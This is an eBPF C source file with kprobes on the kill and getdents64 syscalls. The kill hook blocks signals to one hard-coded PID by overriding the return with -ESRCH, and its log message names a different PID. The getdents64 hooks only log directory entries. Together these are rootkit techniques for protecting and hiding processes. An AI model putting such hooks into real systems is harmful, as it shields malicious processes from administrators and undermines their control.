#define __TARGET_ARCH_x86
#define ESRCH 3

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// Must always include a license
char LICENSE[] SEC("license") = "GPL";

SEC("kprobe/__x64_sys_kill")
int kill_enter(struct pt_regs *ctx)
{
    struct pt_regs *sys_regs =
        (struct pt_regs *)PT_REGS_PARM1(ctx);

    unsigned long di, si;

    bpf_probe_read_kernel(&di, sizeof(di), &sys_regs->di);
    bpf_probe_read_kernel(&si, sizeof(si), &sys_regs->si);

    pid_t pid = (pid_t)di;
    int sig = (int)si;

    // bpf_printk("pid=%d sig=%d", pid, sig);

    if (pid == 7909) {
        bpf_printk("Caught call to protected PID %d", 30749);
        bpf_override_return(ctx, -ESRCH);
    }

    return 0;
}

SEC("kprobe/__x64_sys_getdents64")
int enter_getdents64(struct pt_regs *ctx)
{
    // Read syscall arguments
    struct pt_regs *sys_regs = (struct pt_regs*)PT_REGS_PARM1(ctx);
    unsigned long di, si, dx;
    bpf_probe_read_kernel(&di, sizeof(di), &sys_regs->di);
    bpf_probe_read_kernel(&si, sizeof(si), &sys_regs->si);
    bpf_probe_read_kernel(&dx, sizeof(dx), &sys_regs->dx);

    unsigned int fd = (unsigned int)di;
    struct linux_dirent64 *dirent = (struct linux_dirent64 *)si;
    unsigned int count = (unsigned int)dx;

    char buf[256];

    bpf_printk("fd=%u dent=%p count=%d", fd, dirent, count);

    if(bpf_probe_read_user(buf, sizeof(buf), dirent)) {
        bpf_printk("read_user_buf failed");
        return 0;
    };

    struct linux_dirent64 *dent = (struct linux_dirent64*)buf;

    bpf_printk("d_reclen=%hu", dent->d_reclen);
    
    return 0;
}

SEC("kretprobe/__x64_sys_getdents64")
int exit_getdents64(struct pt_regs *ctx)
{
    long ret = PT_REGS_RC(ctx);
    bpf_printk("returned %ld", ret);
    return 0;
}